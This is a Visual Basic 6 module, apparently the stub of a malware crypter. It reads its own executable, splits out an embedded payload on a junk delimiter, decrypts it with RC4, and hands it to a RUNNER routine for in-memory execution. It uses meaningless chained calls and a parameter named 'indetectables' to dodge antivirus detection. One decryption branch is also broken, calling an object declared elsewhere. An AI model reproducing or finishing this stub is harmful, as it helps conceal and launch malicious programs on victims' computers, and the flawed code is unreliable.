Attribute VB_Name = "fds"
'coded by ha4x0r'
Option Explicit

Dim puts As String, nm() As String, L As New clsRC4, mxe As String
Dim ge() As Byte
Const sa = "gdsa·$&/ALREOJFSFSDFS)P(ñp8o´&%IPSQAE)(&Ksfdahdfs$&ESDFASDMRHP/(GASDHGASYZTGRESDDSA)%TagYEFFAHADFJDGL /asgsdfSDAa*=)jfgASDGASsjkhf/)O%$&(K~¬€¬kjdhgkghdkdg¬&%(=hadhdfga=$·&gjhsdfjsa/"

Private Sub Main()
Call a
End Sub

Sub bn()
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #2
puts = Space(LOF(2))
Get #2, , puts
Close #2
Call xx
Call xz
Call zm
End Sub

Sub a()
Call b
End Sub
Sub b()
Call C
End Sub
Sub C()
Call D
End Sub

Sub D()
Call e
End Sub

Sub e()
Call F
End Sub

Sub F()
Call G
End Sub

Sub G()
Call h
End Sub

Sub h()
Call bn
End Sub

Sub xx()
Call cute(puts)
End Sub

Sub xz()
Call memo(mxe)
End Sub

Sub zm()
Call nme
End Sub

Public Sub cute(indetectables As String)
nm() = Split(indetectables, sa)
If nm(1) = 1 Then
mxe = L.DecryptString(nm(2), sa)
End If
If nm(1) = 3 Then
Dim wer As New clsRC4
mxe = wer.DecryptString(nm(2), sa)
End If
If nm(1) = 4 Then
Dim blo As New clsBlowFish
mxe = wer.DecryptString(nm(2), sa)
End If
End Sub


Sub nme()
Call RUNNER(App.Path & "\" & App.EXEName & ".exe", ge(), Command)
End Sub

Public Sub memo(memo As String)
ge() = StrConv(memo, vbFromUnicode)
End Sub
